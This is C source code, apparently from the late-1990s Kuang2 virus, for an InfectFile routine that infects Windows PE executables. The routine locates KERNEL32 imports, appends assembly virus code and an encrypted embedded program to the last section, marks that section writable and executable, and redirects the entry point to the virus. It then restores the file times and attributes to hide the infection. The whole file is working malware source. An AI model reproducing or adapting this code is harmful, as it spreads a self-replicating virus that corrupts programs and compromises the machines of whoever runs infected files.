/***[ThuNderSoft]*************************************************************
							   KUANG2: InfectFile
								   ver: 0.19
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.19 (26-may-1999): test mod
// ver 0.18 (19-may-1999): overlay, bss sekcije
// ver 0.16 (18-may-1999): bug kod ITrva2ofs, vi„e istih DLLova
// ver 0.14 (15-may-1999): HNA i IAT
// ver 0.10 (14-may-1999): born code

#include <windows.h>
#include <ctypew.h>
#include <win95e.h>

// when I_TESMODE is defined than all informations about
// file infection are logged
//#define I_TESTMODE

// when I_TESTMODE_API is defined than all IMPORT functions
// are logged.
//#define I_TESTMODE_API




#ifdef I_TESTMODE
HANDLE testIfile;
DWORD Iwritten;
char _testb[16];
#endif

// ms-dos exe file signatures
#define		IMAGE_DOS_SIGNATURE1	0x5A4D		// MZ
#define		IMAGE_DOS_SIGNATURE2	0x4D5A		// ZM

// aprox size of the virus (bigger than real size) (for file mapping)
#define		VIRUSLEN	12500

// name of exe file that will be added to host PE file
// (thats name of Kuang2.exe from command line)
extern char* addfile;

// extern variables from virus asm code
extern char virus_start, virus_end;
extern unsigned int addfile_size;
extern unsigned int oldEntryPoint, oldEntryPointRVA, oldEPoffs, oldfilesize;
extern unsigned int oldoffs1, olddata1, oldoffs2, olddata2, oldoffs3, olddata3, oldoffs4, olddata4, oldoffs5, olddata5;
extern unsigned int ddGetModuleHandleA, ddGetProcAddress;
extern char kript;



/*
	InfectFile
	----------
  > Infect any PE EXE file
  > Doesnt check extension or is hos already infected
  > it saves attributes and host file time
  > returns 0 if everything is OK. */

int InfectFile(char *fname)
{
	HANDLE hfile, hfilemap, haddfile;
	unsigned int fsize;				// file size
	char *filemap;					// pointer inside of the MMF
	char *filestart;				// pointer to MMF start
	unsigned int retvalue;			// this function return value
	unsigned int fattr;				// file attributes
	unsigned int NumberOfSections;	// number of section in PE file
	unsigned int *EntryPointRVA;	// pointer for EntryPoint RVA
	unsigned int ImageBase;			// Image base address
	unsigned int SectionAlign;		// alignment size of sections
	unsigned int *SizeofImage;		// pointer to the SizeOfImage
	PIMAGE_DATA_DIRECTORY entry_idd;// pointer to the first Data directory
	char *ImportTable;				// Import Table
	unsigned int ISrva2ofs;			// for conversion RVA into file offset (for Import Section)
	unsigned int *IAT, *HNA;		// Import Address Table & Hint Name Address
	unsigned int *UseT;				// eather IAT or HNA
	char *module_name;				// name of IMPORT modul
	char *virusstart;				// file offset where virus should start
	char kernel32[]="KERNEL32.DLL"; // kernel32.dll
	char getmodulehandle[]="GetModuleHandleA";  // names
	char getprocaddress[]="GetProcAddress";     // names
	unsigned int GetModuleHandleRVA;			// RVA adresa virus wil find...
	unsigned int GetProcAddressRVA;				// ...this functions
	unsigned int i;								// local
	unsigned int raw_virussize;					// asm virus code size (without add exe)
	unsigned int align_virussize;				// aligned virus size
	unsigned int overlay;						// overlaya size if there is one
	FILETIME creation_time, lastacc_time, lastwr_time;
#define		function_name		module_name

#ifdef I_TESTMODE
	testIfile=CreateFile("c:\\k2test_i.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	WriteFile(testIfile, fname, lstrlen(fname), &Iwritten, NULL);
#endif





/*** START & FILE PREPARING ***/

	// take file attributes and if ReadOnly is set than reset it
	fattr=GetFileAttributes(fname);			// take file attributes
	if (fattr & FILE_ATTRIBUTE_READONLY)	// reset readonly if there is one
		SetFileAttributes(fname, fattr ^ FILE_ATTRIBUTE_READONLY);

	// open file
	hfile=CreateFile(fname, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) {retvalue=0x10; goto end1;}

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nopen", 6, &Iwritten, NULL);
#endif

	// get file size
	fsize=GetFileSize(hfile, NULL);
	if (fsize>0xFFFFFFFF-VIRUSLEN) {retvalue=0x11; goto end2;}	// if file is too big
	if (fsize<256) {retvalue=0x11; goto end2;}					// if file is too small
	oldfilesize=fsize;						// store original file size

	// save original file time
	GetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);

	// create MMF (Memory Mapped File object)
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READWRITE, 0, fsize+VIRUSLEN, NULL);
	if (hfilemap==NULL) {retvalue=0x12; goto end2;}
	// cretae MMF view on whole file
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_ALL_ACCESS, 0,0,0);
	if (filemap==NULL) {retvalue=0x13; goto end3;}
	filestart=filemap;

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nmapped", 8, &Iwritten, NULL);
#endif

	// check if file is DOS EXE
	if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE1)			// e_magic == MZ ?
		if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE2)		// e_magic == ZM ?
			{retvalue=0x101; goto end4;}								// not a EXE, get out

	// move to the PE exe header
	filemap += ((PIMAGE_DOS_HEADER)filemap)->e_lfanew;

	// check PE signature 
	if (IsBadCodePtr((FARPROC)filemap)) {retvalue=0x102; goto end4;}
	if (*(DWORD *)filemap != IMAGE_NT_SIGNATURE)	// 'PE00'
		{retvalue=0x102; goto end4;}

	// jump over signature: now we are on the top of PE header
	filemap += sizeof(DWORD);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nPEok", 6, &Iwritten, NULL);
#endif





/*** GETTING DATA ***/

	// get section numbers
	NumberOfSections = ((PIMAGE_FILE_HEADER)filemap)->NumberOfSections;

	// jump over PE header and now pointing to the PE Optional header
	filemap += IMAGE_SIZEOF_FILE_HEADER;

	// check if file is GUI (not a console exe)
	if (((PIMAGE_OPTIONAL_HEADER)filemap)->Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI)
		{retvalue=0x103; goto end4;}

	// store entry point header
	i=(unsigned int)filemap + 16;		// 16 = offset up to EntryPoint
	EntryPointRVA = (unsigned int *)i;
	// store ImageBase
	ImageBase = ((PIMAGE_OPTIONAL_HEADER)filemap)->ImageBase;
	// store section Alignment 
	SectionAlign = ((PIMAGE_OPTIONAL_HEADER)filemap)->FileAlignment;
	// get pointer to SizeOfImage
	i=(unsigned int)filemap + 56;				// 56 = offset up to SizeOfImage
	SizeofImage = (unsigned int *)i;
	// get pointer to DirectoryData
	i=(unsigned int)filemap + 96;				// 96 = offset up to DirectoryData
	entry_idd = (PIMAGE_DATA_DIRECTORY) i;

	// is there a IMPORT section - if not then size==0
	if (!(entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).Size)
		{retvalue=0x105; goto end4;}

	// jump over PE Optional Header, and now we are pointing at
	// Section Table begining. This table has NumberOfSections of
	// Section Headers
	filemap += sizeof(IMAGE_OPTIONAL_HEADER);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nimport ok", 10, &Iwritten, NULL);
#endif





/*** FINDING IMPORT SECTION ***/

	i=0; ImportTable=NULL;

	// search whole Section Table for Import Section (contains IT)
	// also, there is need for last Section Header
	while (i<NumberOfSections) {

#ifdef I_TESTMODE
// Section Name
		wsprintf(_testb, "\r\n%.8s", ((PIMAGE_SECTION_HEADER)filemap)->Name);
		WriteFile(testIfile, _testb, 10, &Iwritten, NULL);
#endif

		// Is current section IMPORT section?
		// It checks is VirtualAddress from DirectoryData[IMPORT]
		// between RVA borders of current section: [VirtualAddress, VirtualAddress+SizeOfRawData).
		if (!ImportTable)	// if IMPORT section still not found
		if ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData) {
			// local 
			ISrva2ofs = (unsigned int) filestart + ((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress;
			// IMPORT section found!, get file offset
			ImportTable = (char *) ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress + ISrva2ofs);
			// still have to search for last section...
		}

		// next section
		filemap+=IMAGE_SIZEOF_SECTION_HEADER;		// sizeof(IMAGE_SECTION_HEADER);
		i++;
	}

	// error - no IMPORT section
	if (!ImportTable) {retvalue=0x106; goto end4;}






/*** FIND ALL KERNEL32.DLLs ***/

	// reset pointers
	GetModuleHandleRVA=GetProcAddressRVA=0;

	while (1) {

		// get DLL name
		i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Name;
		if (i) module_name = (char *) (ISrva2ofs + i);
			else break;			// end, no more DLLs

		// is DLL name == 'KERNEL32.DLL'
		if (!lstrcmpi(module_name, kernel32)) {


			/*** KERNEL32 FOUND - FIND WINAPI FUNCTIONS ***/

			// get file offset to IAT
			i=ISrva2ofs + (unsigned int)((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->FirstThunk;
			IAT=(unsigned int*) (i);
			// get file offset to HNA, if there is one
			i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Characteristics;
			if (i) {
				i+=ISrva2ofs;
				HNA=(unsigned int*) (i);
			} else HNA=0;

			UseT=IAT;				// default: search IAT
			if (HNA)				// if there is HNA (not Borland exe)
				if (*HNA != *IAT)	// if IAT & HNA are not the same
					UseT=HNA;		// then IAT is optimised (Micro$oft), so search HNA

			// search HNA or IAT for needed functions
			while (*UseT) {
				// only ordinal given, continue
				if ((signed int)(*UseT) < 0) {
					UseT++; IAT++;
					continue;
				}
				// there is a function name, cause ordinal does not have to exist!
				i = *UseT + ISrva2ofs;
				function_name = ((PIMAGE_IMPORT_BY_NAME)i)->Name;

#ifdef I_TESTMODE_API
				WriteFile(testIfile, "\r\n", 2, &Iwritten, NULL);
				WriteFile(testIfile, function_name, lstrlen(function_name), &Iwritten, NULL);
#endif

				// compare IMPORT function name with 'GetModuleHandleA' if still not found
				if (!GetModuleHandleRVA)
				if (!lstrcmpi(function_name, getmodulehandle)) {
					// found it!, store RVA to IAT [GetModuleHandleA]
					GetModuleHandleRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetProcAddressRVA) break;	// if both functions founded exit loop
				}

				// compare IMPORT function name with 'GetProcAddress' if still not found
				if (!GetProcAddress)
				if (!lstrcmpi(function_name, getprocaddress)) {
					// found it!,store RVA to IAT [GetProcAddress]
					GetProcAddressRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetModuleHandleRVA) break;	// if both function founded exit loop
				}

				// next IMPORT function
				UseT++; IAT ++;
			}	// while, search is finished

			// if both function founded exit loop			
			if (GetModuleHandleRVA && GetProcAddressRVA) break;
		}

		// go to the next IMPORT library
		ImportTable += sizeof (IMAGE_IMPORT_DESCRIPTOR);
	};

	if (!GetModuleHandleRVA)			// this function not found - critical error!
		{retvalue=0x108; goto end4;}
//	if (!GetProcAddressRVA)				// this function not found 
//		{retvalue=0x109; goto end4;}	// but we can get its address from KERNEL32.DLL

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nattach", 8, &Iwritten, NULL);
#endif






/*** ATTACH FILE ***/

#define		viruscode	module_name
#define		temp		ISrva2ofs
#define		j			NumberOfSections

	// open addexe file that will be written too
	haddfile=CreateFile(addfile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (haddfile==INVALID_HANDLE_VALUE) {retvalue=0x10A; goto end4;}
	// take its size and store it
	addfile_size=GetFileSize(haddfile, NULL);

	// get filemap back so it point to last section
	// but! there are sections with PointerToRawData==0 or SizeOfRawData==0
	// and they do not really exist in the file
	do {
		filemap -= IMAGE_SIZEOF_SECTION_HEADER;
		temp=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;
		i=((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData;
	} while ( !temp || !i );

	// find file offset where virus should be added. Unfortunatley,
	// VirtualSize can be 0 (Watcom) so we cant used it
	i+=temp;
	if (fsize>i) overlay=fsize-i; else overlay=0;
	virusstart = filestart + i + overlay;			// if there is an overlay, jump over it

	// calculate asm virus RAW size
	raw_virussize=&virus_end-&virus_start;
	// calculate Align size of asm virus + add file
	align_virussize=(((raw_virussize+addfile_size+overlay)/SectionAlign) + 1) * SectionAlign;
	// preuzmi pointer na poetak koda virusa
	// get pointer to start of virus asm code
	viruscode=&virus_start;

	// write into virus RVA+ImageBase WinAPIs addresses
	ddGetModuleHandleA = GetModuleHandleRVA + ImageBase;
	ddGetProcAddress = GetProcAddressRVA;
	if (GetProcAddressRVA) ddGetProcAddress += ImageBase;

	// Promeni RVA entry pointa na RVA poetka virusa
	// Change entry pointa RVA to the RVA of virus start
	oldEntryPoint=*EntryPointRVA + ImageBase;		// save into virus old entry point (RVA + ImageBase)
	oldEntryPointRVA=*EntryPointRVA;				// save into virus only RVA of old entry point
	j=((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress + temp + overlay;
	oldEPoffs=(unsigned int) EntryPointRVA - (unsigned int) filestart;	// save and pointer where id entry pointa
	*EntryPointRVA=j;								// set new RVA of Entry Point

	// get last section size and size of whole file
	oldoffs1=filemap-filestart+16;								// store file offset and
	olddata1=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;	// old datas
	((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData += align_virussize;
	fsize += align_virussize - overlay;

	// change last section size (VirtualSize) if <> 0
	oldoffs4=filemap-filestart+8;									// store fajl offset and
	olddata4=((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize;	// old datas
	if (olddata4)													// set new size if <> 0
		((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize = ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;


	// Change last section size (again) if it exist in DirectoryData.
	// first we must found what section we are using, like efore
	oldoffs2=i=0;
	while (i<IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
		if ((entry_idd[i]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < temp) {
			// section found, save all old datas
			oldoffs2=(unsigned int) &(entry_idd[i].Size) - (unsigned int) filestart;
			olddata2=(entry_idd[i]).Size;
			// change size....
			(entry_idd[i]).Size += align_virussize;
			break;
		}
		i++;
	}

	// change characteristic of last section (by Jacky Qwerty/29A)
	oldoffs3=filemap-filestart+36;								// store file offset and
	olddata3=((PIMAGE_SECTION_HEADER)filemap)->Characteristics; // old datas
	((PIMAGE_SECTION_HEADER)filemap)->Characteristics = (IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE);

	// Grow SizeOfImage for align_virussize
	oldoffs5=(unsigned int)SizeofImage-(unsigned int)filestart;
	olddata5=*SizeofImage;
	*SizeofImage+=align_virussize;

	kript=(char) GetTickCount();	// random number for crypting

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nwrite", 7, &Iwritten, NULL);
#endif





/*** WRITING FILE ***/

	// Write virus into file
	for (j=0; j<raw_virussize; j++) virusstart[j]=viruscode[j];
	// Write EXE after it
	virusstart=&virusstart[raw_virussize];
	ReadFile(haddfile, virusstart, addfile_size, (LPDWORD) &i, NULL);
	// Crypt file, always randomly
	for (j=0; j<addfile_size; j++, kript+=173) virusstart[j]-=kript;
	// close add exe file
	CloseHandle(haddfile);





/*** REGULAR END ***/

	retvalue=0;
	FlushViewOfFile(filestart,0);	// write all changes
end4:
	UnmapViewOfFile(filestart);		// close MMF view
end3:
	CloseHandle(hfilemap);			// close MMF
	// Set file size (always!)
	SetFilePointer(hfile, fsize, NULL, FILE_BEGIN);
	SetEndOfFile(hfile);
	// set old file time
	SetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);
	// set old readonly, if there was one
	if (fattr & FILE_ATTRIBUTE_READONLY) SetFileAttributes(fname, fattr);
end2:
	CloseHandle(hfile);			// close file
end1:

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nend", 5, &Iwritten, NULL);
	CloseHandle(testIfile);
#endif

	return retvalue;			// return result
}

